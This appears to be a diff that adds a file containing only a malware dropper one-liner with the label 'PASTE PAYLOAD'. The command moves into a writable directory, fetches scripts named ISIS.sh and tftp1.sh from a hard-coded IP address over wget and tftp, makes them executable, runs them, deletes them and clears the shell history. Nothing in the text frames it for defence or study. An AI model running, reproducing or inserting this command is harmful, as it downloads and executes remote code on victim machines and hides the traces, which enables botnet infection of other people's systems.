@@ -1,0 +1,4 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.132.53.11/ISIS.sh; chmod 777 *; sh ISIS.sh; tftp -g 185.132.53.11 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c
+
+
+PASTE PAYLOAD ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
